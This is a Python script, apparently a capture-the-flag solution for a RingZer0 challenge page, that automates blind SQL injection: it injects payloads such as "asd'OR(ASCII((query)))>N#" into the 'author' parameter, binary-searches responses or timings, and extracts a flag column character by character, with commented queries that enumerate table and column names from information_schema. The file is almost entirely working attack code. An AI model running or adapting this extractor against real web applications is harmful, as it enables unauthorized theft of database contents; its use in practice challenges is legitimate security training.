import requests
import time

get = "GET"
post = "POST"

url = "http://challenges.ringzer0team.com:20010/chal10.php"
requestType = get
session = requests.Session()
session.headers = {}

sqliParam = "author"
params = {sqliParam : None}

matchingPattern = "Bienvenue sur mon nouveau site"

isTimeBased = False
limitTime = 2500 #milliseconds
convertToChar = False

nbRows = None
lengthColumn = None
lengthColumnSet = False

true_stmt = ""

injectionChar = "asd'OR(ASCII(({query})))>{charCodeOrCount}{true_stmt}#"

injectionCount = "asd'OR(({query}))>{charCodeOrCount}#{true_stmt}"
injectionChar = injectionCount
def find(query, midNb, isCount=True, charOffset=0, offset=0, lowerBound=0, upperBound=None, bSearch=True, space_replace=None):
    injection = injectionCount if isCount else injectionChar
    while upperBound != lowerBound and bSearch or not bSearch and midNb <= upperBound:
        if not bSearch:
            midNb = lowerBound

        sql = buildSQL(query, injection, midNb, charOffset, offset, isCount=isCount)
        sql = sql if space_replace == None else sql.replace(' ', space_replace)
        params[sqliParam] = sql
        if bSearch:
            if matches(params):
                lowerBound = midNb + 1
            else:
                upperBound = midNb
            
            midNb = midNb * 2 if upperBound is None else (lowerBound + upperBound) / 2
        else:
            if matches(params):
                return midNb
            else:
                midNb += 1

    return upperBound

def getLimitTime():
    return limitTime / 1000.0


def buildSQL(query, injection, charCodeOrCount, charOffset, offset, isCount):
    charCodeOrCount = chr(charCodeOrCount) if convertToChar and not isCount else charCodeOrCount
    query = query.format(charOffset='{charOffset:08d}', offset='{offset:08d}')
    query = query.format(charOffset=charOffset, offset=offset)
    injection = injection.format(query='{query}', charCodeOrCount='{charCodeOrCount:08d}', true_stmt=true_stmt)
    return injection.format(query=query, charCodeOrCount=charCodeOrCount, true_stmt=true_stmt)


def matches(parameters):
    result = executeQuery(parameters)
    if isTimeBased and result >= getLimitTime() or \
        not isTimeBased and matchingPattern in result:
        return True
    else:
        return False

def executeQuery(parameters):
    start = time.time()
    if requestType == get:
        r = session.get(url, params=parameters)
    else: # requestType == post
        r = session.post(url, data=parameters)

    txt = r.text
    end = time.time()

    if isTimeBased:
        return end - start
    return txt

	
	
#sqlNbRows = "SELECT(COUNT(*))FROM(information_schema.columns)" \
#            "WHERE(table_schema=database())"
#sqlLengthColumnName = "SELECT(LENGTH(CONCAT(table_name,'::',column_name)))" \
#                      "FROM(information_schema.columns)"\
#                      "WHERE(table_schema=database())"\
#                      "LIMIT/**/{offset},1"
#sqlCharacterColumnName = "SELECT(ASCII(SUBSTR(CONCAT(table_name,'::',column_name),{charOffset},1)))" \
#                         "FROM(information_schema.columns)"\
#                         "WHERE(table_schema=database())"\
#                         "LIMIT/**/{offset},1"

sqlNbRows = "SELECT(COUNT(*))FROM(flagoConQueso)"
sqlLengthColumnName = "SELECT(LENGTH(flag))" \
                      "FROM(flagoConQueso)"\
                      "LIMIT/**/{offset},1"
sqlCharacterColumnName = "SELECT(ASCII(SUBSTR(flag,{charOffset},1)))" \
                         "FROM(flagoConQueso)"\
                         "LIMIT/**/{offset},1"

nbRows = find(sqlNbRows, 50) if nbRows == None else nbRows
print("Nb rows : {}".format(nbRows))

lastSkip = None
for rowIndex in range(nbRows):
    lengthColumn = find(sqlLengthColumnName, 50, offset=rowIndex) if lengthColumn == None else lengthColumn
    print("Length column {} : {}".format(rowIndex, lengthColumn))

    columnName = ""
    for charIndex in range(lengthColumn):
        try:
            found = find(sqlCharacterColumnName,
                                  255/2,
                                  isCount=False,
                                  charOffset=charIndex + 1,
                                  offset=rowIndex,
                                  lowerBound=0,
                                  upperBound=255)
            columnName += chr(found)
            print(columnName)
        except KeyboardInterrupt:
            now = time.time()
            if lastSkip != None and now - lastSkip < 1:
                raise
            else:
                break
            lastSkip = time.time()
    print(columnName)
    if not lengthColumnSet:
        lengthColumn = None
